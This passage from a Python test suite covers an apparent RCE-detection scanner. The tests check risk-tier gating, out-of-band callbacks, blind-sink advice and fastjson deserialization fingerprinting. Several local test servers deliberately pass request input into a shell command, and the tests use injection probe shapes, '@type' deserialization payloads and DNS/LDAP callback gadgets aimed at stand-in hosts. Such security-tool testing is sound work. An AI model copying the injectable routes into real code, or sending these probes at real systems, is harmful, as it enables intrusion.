    a class fetched from an address RCEKit did not choose.

    `deser`'s DNS gadget is the first of these. It makes the target resolve a
    name, which is the very thing `oob` and `lookup` are refused for at `safe`,
    and its only gate was `--oob-host`. Holding it back would have sent fewer
    probes at the default tier.
    """

    def setUp(self):
        self.rec = make_record(environment="java", context="raw")

    def _run(self, config):
        import random as _random
        gen = RCEKit()
        method = rcekit.DeserSink(gen, config)
        built = method.build_probes(self.rec, _random.Random(1))
        return built, gen._apply_target_profile(method, built), gen

    def test_the_dns_gadget_goes_out_at_the_default_tier(self):
        built, sent, gen = self._run({"oob_host": "x.example", "max_safety": "safe",
                                      "deser_formats": ["java"]})
        self.assertTrue(any(p.phase == "dns" for p in built))
        self.assertEqual(len(sent), len(built), "a reaching shape was held back")
        self.assertEqual(gen.safety_held_probes, 0)

    def test_and_the_run_says_it_went(self):
        _, _, gen = self._run({"oob_host": "x.example", "max_safety": "safe",
                               "deser_formats": ["java"]})
        self.assertEqual(gen.reach_noted_probes, 1)
        self.assertTrue(any("reaches intrusive" in note for note in gen.reach_notes),
                        f"the run did not say how far it reached: {gen.reach_notes}")

    def test_nothing_is_noted_once_the_tier_covers_it(self):
        # The notice is for reach the operator did not ask for. At `intrusive`
        # they did, so there is nothing to disclose.
        _, _, gen = self._run({"oob_host": "x.example", "max_safety": "intrusive",
                               "deser_formats": ["java"]})
        self.assertEqual(gen.reach_noted_probes, 0)

    def test_reaching_and_being_held_are_counted_apart(self):
        """Three tallies, because they say three different things.

        A profile drop means the probe could not have reached the sink. A
        safety hold means it could and was not sent. A reach note means it was
        sent, further than the tier asked for. One number would state the
        wrong one about all three.
        """
        import random as _random
        gen = RCEKit()
        held = rcekit.LookupCallback(gen, {"oob_host": "x.example", "max_safety": "intrusive"})
        gen._apply_target_profile(held, held.build_probes(self.rec, _random.Random(1)))
        noted = rcekit.DeserSink(gen, {"oob_host": "x.example", "max_safety": "safe",
                                       "deser_formats": ["java"]})
        gen._apply_target_profile(noted, noted.build_probes(self.rec, _random.Random(1)))
        self.assertGreater(gen.safety_held_probes, 0)
        self.assertGreater(gen.reach_noted_probes, 0)
        self.assertEqual(gen.profile_dropped_probes, 0)

    def test_a_shape_that_cannot_be_undone_is_still_held(self):
        # The rule has an edge, and this is it: `lookup`'s ldap/rmi shapes can
        # make the target fetch a class, which a notice does not take back.
        import random as _random
        gen = RCEKit()
        method = rcekit.LookupCallback(gen, {"oob_host": "x.example",
                                             "max_safety": "intrusive"})
        built = method.build_probes(self.rec, _random.Random(1))
        sent = gen._apply_target_profile(method, built)
        self.assertEqual({p.carrier for p in sent}, {"dns"})
        self.assertEqual(gen.reach_noted_probes, 0,
                         "a shape that cannot be undone was disclosed instead of held")


class CostEstimateSafetyTestCase(unittest.TestCase):
    """The cost line has to describe the run it precedes.

    It applied the target profile and not the risk tier, so once a rung could
    narrow a method the estimate over-counted -- by a factor of three for
    `lookup` at the default tier, which is exactly the operator who narrowed
    the run on purpose. An audit line that is wrong for the person auditing is
    worse than no line.
    """

    def _estimate(self, methods, config):
        gen = RCEKit()
        records = [make_record(environment="java", context="raw")]
        return gen.estimate_detection_probes(iter(records), methods, config), gen

    def test_the_estimate_shrinks_with_the_tier_the_run_will_use(self):
        intrusive, _ = self._estimate(
            ["lookup"], {"oob_host": "x.example", "max_safety": "intrusive"})
        stateful, _ = self._estimate(
            ["lookup"], {"oob_host": "x.example", "max_safety": "stateful"})
        self.assertGreater(stateful, intrusive,
                           "the estimate ignores the rung that narrows the run")
        self.assertEqual(stateful, intrusive * 3,
                         "three schemes at the top rung, one below it")

    def test_estimating_moves_none_of_the_numbers_the_report_prints(self):
        # The estimate runs before the report and shares the run's predicate.
        # If it tallied, the operator would be told probes were held back on a
        # run that had not started.
        _, gen = self._estimate(
            ["lookup"], {"oob_host": "x.example", "max_safety": "intrusive"})
        self.assertEqual(gen.safety_held_probes, 0)
        self.assertEqual(gen.profile_dropped_probes, 0)


class SafetyRungCLITestCase(unittest.TestCase):
    """The rung has to be enforced where the operator meets it."""

    def _run(self, *extra):
        return subprocess.run(
            [sys.executable, str(SCRIPT), "--verify-url", "http://127.0.0.1:9/x?q=FUZZ",
             "--acknowledge-consent", *extra],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)

    def test_an_intrusive_method_is_refused_at_the_default_tier(self):
        result = self._run("--methods", "lookup", "--oob-host", "x.example")
        self.assertIn("--verify-active-risk intrusive", result.stdout)
        self.assertNotEqual(result.returncode, 0)

    def test_the_refusal_names_the_method_and_its_rung(self):
        result = self._run("--methods", "lookup", "--oob-host", "x.example")
        self.assertIn("lookup", result.stdout)
        self.assertIn("intrusive technique", result.stdout)

    def test_file_sends_probes_through_the_cli_at_the_default_tier(self):
        """The gap that let the runtime filter break a documented invocation.

        Every other `file` test builds the method's config directly, so the
        ceiling fell back to the method's own rung and the probes went out.
        Only a run through the CLI carries `max_safety`, and only there did the
        method accept its flags and then test nothing.
        """
        import os

        writedir = shell_writable_dir()

        def route(method, path, params, headers, body):
            if path.startswith("/files/"):
                served = os.path.join(writedir, os.path.basename(path))
                if os.path.exists(served):
                    with open(served) as handle:
                        return 200, handle.read()
                return 404, "not found"
            pipe = sh_popen("echo LOOKUP " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            result = subprocess.run(
                [sys.executable, str(SCRIPT), "--verify-url", f"{base}/?host=FUZZ",
                 "--methods", "file", "--acknowledge-consent",
                 "--webroot", writedir, "--web-base-url", f"{base}/files",
                 "--max-payloads", "3", "--verify-timeout", "10"],
                cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=300)
        self.assertNotIn("NOTHING WAS TESTED", result.stdout,
                         "a configured `file` run tested nothing at the default tier")
        self.assertNotIn("--verify-active-risk stateful", result.stdout,
                         "a configured `file` run was sent to raise the risk tier")
        self.assertRegex(result.stdout, r"\[detect\] sent [1-9]")

    def test_a_config_gated_method_is_told_what_it_needs_not_which_tier(self):
        # `--methods file` with nothing configured used to say `--webroot`, and
        # still must: telling an operator to raise the risk tier when what is
        # missing is a directory would send them the wrong way.
        result = self._run("--methods", "file")
        self.assertIn("--webroot", result.stdout)
        self.assertNotIn("--verify-active-risk stateful", result.stdout)


class BlindSinkAdviceTestCase(unittest.TestCase):
    """A sink that returns no output cannot be confirmed by a results-based
    method — there is nowhere for the computed value to appear. That is what
    'blind' means, not a limitation to route around. But a run that only says
    "no execution proven" reads exactly like a clean target."""

    class _Args:
        def __init__(self, webroot=None, web_base_url=None,
                     file_write_path=None, file_read_url=None):
            self.webroot = webroot
            self.web_base_url = web_base_url
            self.file_write_path = file_write_path
            self.file_read_url = file_read_url

    def test_in_band_only_runs_get_the_advice(self):
        lines = rcekit.blind_sink_advice(["reflected", "eval"], self._Args())
        self.assertTrue(lines)
        joined = "\n".join(lines)
        for method in ("--methods oob", "--methods file", "--methods time"):
            with self.subTest(method=method):
                self.assertIn(method, joined)

    def test_it_says_a_negative_does_not_rule_out_execution(self):
        joined = "\n".join(rcekit.blind_sink_advice(["reflected"], self._Args()))
        self.assertIn("does not rule out execution", joined)

    def test_the_suggested_oob_command_is_one_the_tool_will_accept(self):
        # oob is gated on the intrusive tier, so advice that omitted the flag
        # would name a command the tool then refuses to run.
        joined = "\n".join(rcekit.blind_sink_advice(["reflected"], self._Args()))
        oob_line = next(line for line in joined.splitlines() if "--methods oob" in line)
        self.assertIn("--oob-host", oob_line)
        self.assertIn("--verify-active-risk intrusive", oob_line)

    def test_a_blind_capable_method_already_ran_so_no_advice(self):
        for methods in (["oob"], ["time"], ["file"], ["reflected", "oob"],
                        ["reflected", "eval", "time"]):
            with self.subTest(methods=methods):
                self.assertEqual(rcekit.blind_sink_advice(methods, self._Args()), [])

    def test_no_methods_at_all_gets_no_advice(self):
        self.assertEqual(rcekit.blind_sink_advice([], self._Args()), [])

    def test_the_file_line_is_dropped_once_a_web_root_is_known(self):
        args = self._Args(webroot="/var/www/html", web_base_url="https://t")
        joined = "\n".join(rcekit.blind_sink_advice(["reflected"], args))
        self.assertNotIn("--webroot DIR", joined)
        self.assertIn("--methods oob", joined)

    def test_time_is_marked_as_reaching_its_own_tier_and_not_execution(self):
        joined = "\n".join(rcekit.blind_sink_advice(["reflected"], self._Args()))
        self.assertRegex(joined, r"--methods time.*timing-sink, NOT execution")
        # And not as a candidate. The advice is a command the operator will run
        # and then read a verdict from, and `needs-review` is not the word that
        # comes back from it.
        self.assertNotRegex(joined, r"--methods time.*needs-review")

    # How each tier may be spelled in prose. A tier missing from this map is one
    # no advice line knows how to describe, which the test below says out loud
    # rather than passing over.
    #
    # Stems, not words. "confirms" alone would have let the overclaim back in
    # through "confirming RCE", "confirmed execution" or "confirmation" -- an
    # assertion that answers the same way for the right reason and the broken
    # one, which is the defect this whole file exists to catch.
    _TIER_WORDS = {
        "executed": ("execution", "executed"),
        "needs-review": ("needs-review",),
        "timing-sink": ("timing sink", "timing-sink"),
        "file-write": ("file write", "file-write"),
        "evaluation-sink": ("evaluation sink", "evaluation-sink"),
        "lookup-sink": ("lookup sink", "lookup-sink"),
        "deserialization-sink": ("deserialization sink", "deserialization-sink"),
    }
    # A denial is the opposite of a claim to confirm, so it comes out before the
    # stems are looked for: "cannot be confirmed by reflected/eval" disclaims,
    # and so does "unconfirmed", which carries its negation inside the word
    # where a rule about preceding words cannot see it.
    _DENIAL_RE = re.compile(
        r"\b(?:never|not|no|without|cannot(?:\s+be)?)\s+"
        r"`?(?:confirm\w*|execut\w*)`?"
        r"|\bunconfirm\w*",
        re.IGNORECASE)

    def test_every_line_states_the_tier_its_method_actually_reaches(self):
        """Advice is a command the operator will run, so the tier it promises
        has to be the tier the method can reach.

        `--methods lookup` shipped in this list saying "confirms" while the
        method reported `lookup-sink` -- beside `oob` and `file`, where the
        same word does mean proven execution. The correction had already landed on
        `LookupCallback.tier`; nothing compared the class to the sentence
        describing it, so the sentence the operator reads kept the old claim.

        Pinning one line by name is what let that happen, so this asks every
        line the same question and sources the answer from the class."""
        lines = rcekit.blind_sink_advice(["reflected"], self._Args())
        self.assertTrue(lines)
        named = 0
        for line in lines:
            match = re.search(r"--methods (\w+)", line)
            if not match:
                continue
            name = match.group(1)
            named += 1
            # The claim is the parenthetical, not the whole line. The rest of
            # the line is the command, and a flag name is not a promise: the
            # `file` line spells `--file-write-path`, which collides with the
            # `file-write` tier and read as the `file` method claiming a tier
            # it does not reach.
            parenthetical = re.search(r"\(([^)]*)\)\s*$", line)
            self.assertIsNotNone(
                parenthetical,
                f"the {name} line carries no parenthetical claim: {line}")
            claim = self._DENIAL_RE.sub("", parenthetical.group(1))
            with self.subTest(method=name):
                self.assertIn(name, rcekit.DETECTION_METHODS,
                              "the advice names a method that does not exist")
                tier = rcekit.DETECTION_METHODS[name].tier
                self.assertIn(tier, self._TIER_WORDS,
                              f"{name} reports {tier!r}, which this test cannot spell -- "
                              "add it to _TIER_WORDS rather than dropping the check")
                self.assertTrue(
                    any(stem in claim for stem in self._TIER_WORDS[tier]),
                    f"the {name} line never says it reaches {tier}: {line}")
                for other, stems in self._TIER_WORDS.items():
                    if other == tier:
                        continue
                    for stem in stems:
                        self.assertNotIn(
                            stem, claim,
                            f"the {name} line promises {other} for a method whose "
                            f"tier is {tier}: {line}")
        self.assertGreaterEqual(named, 3, "the advice named no methods to check")


class BlindSinkAdviceCLITestCase(unittest.TestCase):
    """The advice has to reach the operator through the real CLI, and only when
    it applies."""

    def _detect(self, route, *extra):
        with local_target(route) as base:
            return subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent",
                 "--verify-url", f"{base}/x?q=FUZZ", "--environments", "unix",
                 "--contexts", "raw", "--categories", "basic_enum", *extra],
                capture_output=True, text=True, timeout=300)

    def test_a_blind_sink_is_told_what_would_reach_it(self):
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo probing " + params.get("q", "") + " >/dev/null 2>&1")
            pipe.read()
            pipe.close()
            return 200, "queued"

        result = self._detect(route, "--methods", "reflected,eval")
        self.assertIn("NO OUTPUT", result.stdout)
        self.assertIn("--methods oob", result.stdout)

    def test_a_confirmed_run_is_not_lectured(self):
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo probing " + params.get("q", "") + " 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        result = self._detect(route, "--methods", "reflected")
        self.assertIn("EXECUTED (", result.stdout)
        self.assertNotIn("NO OUTPUT", result.stdout)


class QuoteWrappingContextTestCase(unittest.TestCase):
    """A context that opens *and* closes with the same quote puts the payload
    inside it, so a probe body carrying that quote closes it early and the rest
    is no longer a command. Those probes cost a request and can only ever come
    back negative."""

    def setUp(self):
        self.gen = RCEKit()

    def _payloads(self, context):
        import random as _random
        return [p.payload for p in ReflectedMath(self.gen, {}).build_probes(
            make_record(environment="unix", context=context), _random.Random(1))]

    def test_the_quote_carrying_shape_is_not_sent_into_a_wrapping_context(self):
        self.assertFalse([p for p in self._payloads("attribute") if "awk" in p])

    def test_the_quote_free_shapes_still_are(self):
        payloads = self._payloads("attribute")
        self.assertTrue(payloads)
        self.assertTrue([p for p in payloads if "$((" in p])
        self.assertTrue([p for p in payloads if "${IFS}" in p])

    def test_a_break_out_context_still_gets_it(self):
        # shell_double_quoted CLOSES the sink's quote and comments its tail, so
        # quotes in the body are fine there — the opposite case, and it must not
        # be caught by the same guard.
        self.assertTrue([p for p in self._payloads("shell_double_quoted") if "awk" in p])

    def test_raw_is_untouched(self):
        self.assertTrue([p for p in self._payloads("raw") if "awk" in p])

    def test_the_guard_only_applies_to_verbatim_contexts(self):
        # Where an escape rule applies, the quote belongs to the serialization
        # layer and what the sink sees depends on the parser in between.
        method = ReflectedMath(self.gen, {})
        yaml_record = make_record(environment="unix", context="yaml")
        self.assertFalse(method._context_swallows(yaml_record, 'awk "x"'))
        attr_record = make_record(environment="unix", context="attribute")
        self.assertTrue(method._context_swallows(attr_record, 'awk "x"'))
        self.assertFalse(method._context_swallows(attr_record, "echo x"))

    def test_detection_is_unchanged_by_the_guard(self):
        # The removed probes were the ones that could never confirm, so a real
        # sink must still be confirmed in exactly the contexts it was before.
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo probing " + params.get("q", "") + " 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [make_record(environment="unix", context="attribute")],
                url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "executed"])


class OobWaitTestCase(unittest.TestCase):
    """The callback window is only worth paying while a callback is plausible.
    Callbacks land in a burst once the channel works, so a target that has not
    produced a single one across every probe fired so far is not going to."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _method(self, listener, wait=3.0):
        return rcekit.OobCallback(self.gen, {"oob_host": "x.example",
                                             "oob_listener": listener, "oob_wait": wait})

    def test_the_first_carrier_gets_the_full_window(self):
        import time as _time
        listener = OOBListener()
        method = self._method(listener, wait=1.0)
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=200, body="ok"))]
        started = _time.time()
        method.confirm_each(series)
        self.assertGreaterEqual(_time.time() - started, 0.9)

    def test_later_carriers_are_cut_short_when_nothing_ever_called_back(self):
        import time as _time
        listener = OOBListener()
        method = self._method(listener, wait=30.0)
        method._waited_once = True
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=200, body="ok"))]
        started = _time.time()
        method.confirm_each(series)
        self.assertLess(_time.time() - started, 5.0)

    def test_a_live_channel_still_gets_the_full_window(self):
        # One hit anywhere means callbacks are flowing, so later carriers must
        # not be cut short.
        import time as _time
        listener = OOBListener()
        listener.record("http", "10.0.0.9", "somewhere", "/earlier-token")
        method = self._method(listener, wait=1.0)
        method._waited_once = True
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=200, body="ok"))]
        started = _time.time()
        method.confirm_each(series)
        self.assertGreaterEqual(_time.time() - started, 0.9)

    def test_cutting_the_wait_short_never_changes_a_verdict_that_had_arrived(self):
        listener = OOBListener()
        method = self._method(listener, wait=30.0)
        method._waited_once = True
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:2]
        listener.record("dns", "10.0.0.9", f"{probes[0].expected}.x.example")
        series = [(p, Observation(status=200, body="ok")) for p in probes]
        verdicts = {p.payload: v.status for p, v in method.confirm_each(series)}
        self.assertEqual(verdicts[probes[0].payload], "executed")
        self.assertEqual(verdicts[probes[1].payload], "negative")


class OobSafetyGateTestCase(unittest.TestCase):
    """Detection methods build their own probes and so bypass every corpus-level
    safety filter. That was harmless while every method was inert, but `oob`
    makes the target open outbound connections — and the run printed 'pass
    --verify-active-risk intrusive to also fire ... OOB' and then fired OOB
    anyway, so the tier the operator chose did not mean what it said."""

    def _run(self, *extra):
        return subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent",
             "--verify-url", "http://127.0.0.1:9/x?q=FUZZ", "--environments", "unix",
             "--contexts", "raw", "--categories", "basic_enum",
             "--methods", "oob", "--oob-host", "oob.example.com", *extra],
            capture_output=True, text=True, timeout=300)

    def test_the_default_tier_refuses_and_exits_non_zero(self):
        result = self._run()
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertIn("--verify-active-risk intrusive", result.stdout)

    def test_the_refusal_happens_before_the_listener_starts(self):
        # Binding a port and telling the operator the listener is up, only to
        # refuse afterwards, would be its own small lie.
        result = self._run()
        self.assertNotIn("OOB listener up", result.stdout)

    def test_intrusive_allows_it(self):
        result = self._run("--verify-active-risk", "intrusive",
                           "--listen-http-port", "0")
        self.assertIn("OOB listener up", result.stdout)

    def test_the_plan_no_longer_contradicts_the_run(self):
        # The 'held back ... and OOB' line is printed only at the safe tier, and
        # the safe tier now refuses, so the two can never appear together.
        allowed = self._run("--verify-active-risk", "intrusive", "--listen-http-port", "0")
        self.assertNotIn("low-impact (safe) payloads only", allowed.stdout)
        refused = self._run()
        self.assertNotIn("[detect] sent", refused.stdout)

    def test_other_methods_are_unaffected_by_the_gate(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent",
             "--verify-url", "http://127.0.0.1:9/x?q=FUZZ", "--environments", "unix",
             "--contexts", "raw", "--categories", "basic_enum", "--methods", "reflected"],
            capture_output=True, text=True, timeout=300)
        self.assertEqual(result.returncode, 0, result.stdout)


class DeserShapeVerdictTestCase(unittest.TestCase):
    """The shape differential, and the endpoint shape it used to read backwards.

    The oracle was anchored entirely on the well-formed stream: it reported a
    parser only when that stream was answered differently from *both* the
    truncated form and the magic-plus-noise form. A format whose type name is
    resolved before the parse finishes answers the truncated form exactly as it
    answers the complete one, which collapses that comparison on the very
    endpoints it exists to find.

    The bodies below are the ones fastjson 1.2.83 actually returned under
    vulhub, trimmed to the message that decides the signature."""

    TYPE_ERROR = ('{"timestamp":1790326934057,"status":400,"error":"Bad Request",'
                  '"message":"JSON parse error: type not match. java.lang.String -> '
                  'org.vulhub.fastjsondemo.User; nested exception is '
                  'com.alibaba.fastjson.JSONException: type not match","path":"/"}')
    SYNTAX_ERROR = ('{"timestamp":1790326934325,"status":400,"error":"Bad Request",'
                    '"message":"JSON parse error: syntax error; nested exception is '
                    'com.alibaba.fastjson.JSONException: syntax error","path":"/"}')
    ACCEPTED = '{"age":20,"name":"rk"}'

    def setUp(self):
        self.gen = RCEKit()
        self.method = rcekit.DETECTION_METHODS["deser"](self.gen, {})

    # The payloads the corpus actually sends for this ecosystem, so a test about
    # what comes back can be written against what went out.
    WELL = '{"@type":"java.lang.String","val":"rk"}'
    TRUNC = '{"@type":"java.lang.String","val":'
    MAGIC = '{"@type":'
    NOISE = MAGIC + "k7Qpm2xRz8vTn4LbYc1Wd6Hj0Ag5Ue"
    NOISE_AGAIN = MAGIC + "b3Xf9LpQw2ZmKd7Rt1Yv5Nc8Hj0Ae"

    def _verdict(self, wellformed, truncated, noise, payloads=None, noise_again=None):
        """`noise_again` defaults to the same answer as `noise`, which is what a
        target that held still gives. A test that wants drift says so."""
        sent = payloads or {}
        forms = {name: (Probe(payload=sent.get(name, "x"), expected=""),
                        Observation(status, body))
                 for name, (status, body) in (("wellformed", wellformed),
                                              ("truncated", truncated),
                                              ("noise", noise),
                                              ("noise_again", noise_again or noise))}
        return self.method._shape_verdict("fastjson", forms)[1]

    def _echo(self, length, wrap=None):
        """The four forms as an endpoint that echoes `length` characters of
        whatever it was sent would answer them."""
        sent = {"wellformed": self.WELL, "truncated": self.TRUNC,
                "noise": self.NOISE, "noise_again": self.NOISE_AGAIN}
        bodies = {name: (wrap(p[:length]) if wrap else p[:length])
                  for name, p in sent.items()}
        return (dict(sent),
                (200, bodies["wellformed"]),
                (200, bodies["truncated"]),
                (200, bodies["noise"]),
                (200, bodies["noise_again"]))

    def test_a_type_resolved_before_the_parse_finishes_stays_negative(self):
        # Measured on fastjson 1.2.83: the well-formed and the truncated form
        # both come back naming the class the target resolved, and noise gets a
        # plain syntax error. A route reading noise as the control was tried
        # here and withdrawn -- "noise differs from the structured pair" has
        # explanations that are not a parser, and the one that decided it is a
        # filter refusing the random payload while letting the structured ones
        # through, which no repetition exposes and which this verdict cannot
        # see: refusal is judged against the probe it is anchored to, and that
        # is the well-formed one.
        #
        # So the shape oracle says `negative` on this target and the DNS gadget
        # reaches `deserialization-sink` instead. This pins the outcome so the
        # route is not reintroduced without the refusal problem being solved.
        verdict = self._verdict((400, self.TYPE_ERROR), (400, self.TYPE_ERROR),
                                (400, self.SYNTAX_ERROR))
        self.assertEqual(verdict.status, "negative")
        self.assertIn("a truncated stream as it answers a complete one", verdict.evidence)

    def test_noise_matching_a_structured_form_keeps_the_new_route_shut(self):
        # The guard on the new route: noise answered as the well-formed stream
        # is, so nothing here treats the magic bytes as a type to resolve. The
        # old route does not fire either (it needs the well-formed form to
        # differ from noise), which is what makes this a guard rather than a
        # case the old rule would have caught anyway.
        verdict = self._verdict((400, self.TYPE_ERROR), (500, self.SYNTAX_ERROR),
                                (400, self.TYPE_ERROR))
        self.assertEqual(verdict.status, "negative")

    def test_a_plain_json_endpoint_reaches_needs_review_through_the_old_route(self):
        # Pinning behaviour this change does NOT alter, so the record is honest
        # about it. A plain JSON API accepts the well-formed form -- it is valid
        # JSON -- and rejects the truncated and noise forms alike as syntax
        # errors. The original rule reads that as a parser, although nothing
        # deserialized anything. The new route does not fire here (noise
        # matches the truncated form), so this verdict is the old one, arriving
        # for the old reason.
        verdict = self._verdict((200, self.ACCEPTED), (400, self.SYNTAX_ERROR),
                                (400, self.SYNTAX_ERROR))
        self.assertEqual(verdict.status, "needs-review")
        self.assertIn("well-formed object stream differently", verdict.evidence)
        self.assertNotIn("before the parse finishes", verdict.evidence)

    def test_three_distinct_answers_still_report_a_parser(self):
        # The original route, untouched: nothing that reached needs-review
        # before may stop reaching it.
        verdict = self._verdict((200, self.ACCEPTED), (400, self.TYPE_ERROR),
                                (500, self.SYNTAX_ERROR))
        self.assertEqual(verdict.status, "needs-review")
        self.assertIn("well-formed object stream differently", verdict.evidence)

    def test_an_endpoint_that_answers_everything_alike_stays_negative(self):
        verdict = self._verdict((200, self.ACCEPTED), (200, self.ACCEPTED),
                                (200, self.ACCEPTED))
        self.assertEqual(verdict.status, "negative")
        self.assertIn("every form alike", verdict.evidence)

    def test_a_fixed_prefix_echo_is_inconclusive_not_a_fingerprint(self):
        # An endpoint returning a fixed-length preview of its input answers the
        # well-formed and truncated forms alike -- they share a long prefix --
        # and noise differently, because noise diverges right after the magic.
        # Nothing parsed anything. Without the guard this is the new route's
        # false positive, and the three signatures alone cannot tell it from a
        # parser that resolves the type name early.
        sent, well, trunc, noise, noise2 = self._echo(20)
        verdict = self._verdict(well, trunc, noise, payloads=sent, noise_again=noise2)
        self.assertEqual(verdict.status, "inconclusive")
        self.assertIn("carries the probe back", verdict.evidence)

    def test_a_full_echo_is_caught_on_the_original_route_too(self):
        # The same confound reaches the original route when the echo is long
        # enough to make all three answers differ. Guarding one route and not
        # the other would leave the fingerprint available by the other door.
        sent, well, trunc, noise, noise2 = self._echo(len(self.WELL))
        verdict = self._verdict(well, trunc, noise, payloads=sent, noise_again=noise2)
        self.assertEqual(verdict.status, "inconclusive")

    def test_an_echo_of_exactly_the_magic_is_still_an_echo(self):
        # All three forms come back identical here, so the differential is
        # empty and the old verdict was `negative` -- "nothing here parses the
        # format". But the endpoint plainly did something with the input, and
        # what it did was hand it back. `negative` is a claim about the target;
        # this is a statement about the channel.
        sent, well, trunc, noise, noise2 = self._echo(len(self.MAGIC))
        verdict = self._verdict(well, trunc, noise, payloads=sent, noise_again=noise2)
        self.assertEqual(verdict.status, "inconclusive")

    def test_an_echo_shorter_than_the_magic_is_not_read_as_reflection(self):
        # Below the magic there is nothing of this format in what came back, so
        # there is no reflection to find and nothing to hold the verdict at
        # inconclusive. The floor has to be somewhere, and the magic is where
        # the payload stops being indistinguishable from any other body.
        sent, well, trunc, noise, noise2 = self._echo(len(self.MAGIC) - 1)
        verdict = self._verdict(well, trunc, noise, payloads=sent, noise_again=noise2)
        self.assertEqual(verdict.status, "negative")

    def test_a_wrapped_echo_is_caught_in_every_ecosystem(self):
        # The gap this closes. `_encoded_search` decodes base64 runs of 16
        # characters and hex runs of 16, the right floor for a short decimal
        # where a spurious decode could match by accident. These sentinels are
        # shorter than that: a six-byte Java sentinel is eight base64
        # characters, and fastjson's sixteen are fourteen once `==` is
        # discounted -- so a base64-wrapped echo walked past the guard in three
        # of the five ecosystems, including the one the route was built for.
        #
        # Every ecosystem, every wrapping, and the echo lengths either side of
        # the magic, because the first version of this test checked one
        # ecosystem at one length and passed while three others were open.
        method = rcekit.DETECTION_METHODS["deser"](RCEKit(), {})
        probes = RCEKit().deser_probes
        for name, spec in probes.items():
            magic, well = str(spec.get("magic") or ""), str(spec.get("wellformed") or "")
            sentinels = [s for s in method._reflection_sentinels(magic, well) if s]
            # base64 maps three bytes to four characters, so a prefix's
            # encoding is a prefix of the encoding only on a three-byte
            # boundary. Reaching an echo of exactly the magic would mean
            # building the sentinel from fewer bytes than the magic -- which a
            # wrapper-only echo matches, and that false positive is the whole
            # reason the sentinels are anchored on the magic at all. So base64
            # is recognised from the first boundary at or past the magic's end,
            # and the floor is asserted rather than left to be discovered.
            floors = {"raw": len(magic), "hex": len(magic), "HEX": len(magic),
                      "base64": -(-len(magic) // 3) * 3}
            for length in (len(magic), len(magic) + 1, len(magic) + 5, len(well)):
                echo = well[:length]
                for label, body in (
                        ("raw", echo),
                        ("base64", base64.b64encode(echo.encode()).decode()),
                        ("hex", echo.encode().hex()),
                        ("HEX", echo.encode().hex().upper())):
                    if length < floors[label]:
                        continue
                    with self.subTest(ecosystem=name, echo=length, wrapping=label):
                        self.assertTrue(
                            any(method._search(s, body) for s in sentinels),
                            f"{name}: a {label} echo of {length} characters is not "
                            f"recognised as reflection")
            # And the floor is a floor, not a coincidence: one byte under it,
            # a base64 echo must NOT be recognised, or the sentinel is shorter
            # than the magic and the wrapper can supply the match on its own.
            below = floors["base64"] - 3
            if below >= len(magic):
                body = base64.b64encode(well[:below].encode()).decode()
                with self.subTest(ecosystem=name, echo=below, wrapping="base64-below-floor"):
                    self.assertFalse(any(method._search(s, body) for s in sentinels))

    def test_a_wrapped_echo_is_caught_where_the_context_escaped_the_magic(self):
        # The same gap again, by the other door. A transport context escapes the
        # payload before it goes out, and two of the five magics are made of
        # characters that escaping moves: fastjson's `{"@type":` leaves as
        # `{\"@type\":` inside a JSON body, which is the most ordinary way that
        # ecosystem is delivered at all. `payload.find(magic)` then fails and
        # every anchored sentinel was dropped for the bare magic alone -- so the
        # base64 fix above was undone precisely where it mattered most.
        #
        # A raw escaped echo still came back, but only by luck: `_encoded_search`
        # happens to try `unicode_escape`. Decoding is one level deep, so a
        # base64- or hex-wrapped echo decodes to still-escaped text the bare
        # magic cannot match, and a pure echo was reported as a fingerprint.
        gen = RCEKit()
        method = rcekit.DETECTION_METHODS["deser"](gen, {})
        rules = sorted({str(ctx.get("escape", "none"))
                        for ctx in gen.contexts.values()} - {"none"})
        self.assertTrue(rules, "no context declares an escape rule")
        for name, spec in gen.deser_probes.items():
            magic = str(spec.get("magic") or "")
            well = str(spec.get("wellformed") or "")
            for rule in rules:
                payload = gen._escape_for_context(well, rule)
                escaped_magic = gen._escape_for_context(magic, rule)
                sentinels = [s for s in method._reflection_sentinels(magic, payload) if s]
                # Every shipped escape rule maps character by character, so the
                # escaping of a prefix is a prefix of the escaping. Asserted,
                # because the anchoring below rests on it.
                self.assertTrue(payload.startswith(escaped_magic),
                                f"{name}/{rule}: the escaped magic is not a prefix "
                                f"of the escaped payload")
                # The escaped magic is a sentinel in its own right, so a raw
                # escaped echo is recognised by what it contains rather than by
                # whichever decode `_encoded_search` happens to attempt.
                self.assertIn(escaped_magic, sentinels,
                              f"{name}/{rule}: the escaped magic is not a sentinel")
                need = len(payload[:len(escaped_magic)].encode())
                floors = {"raw": need, "hex": need, "HEX": need,
                          "base64": -(-need // 3) * 3}
                for length in (need, need + 1, need + 5, len(payload)):
                    echo = payload[:length]
                    for label, body in (
                            ("raw", echo),
                            ("base64", base64.b64encode(echo.encode()).decode()),
                            ("hex", echo.encode().hex()),
                            ("HEX", echo.encode().hex().upper())):
                        if length < floors[label]:
                            continue
                        with self.subTest(ecosystem=name, escape=rule,
                                          echo=length, wrapping=label):
                            self.assertTrue(
                                any(method._search(s, body) for s in sentinels),
                                f"{name}/{rule}: a {label} echo of {length} "
                                f"characters is not recognised as reflection")
                below = floors["base64"] - 3
                if below >= need:
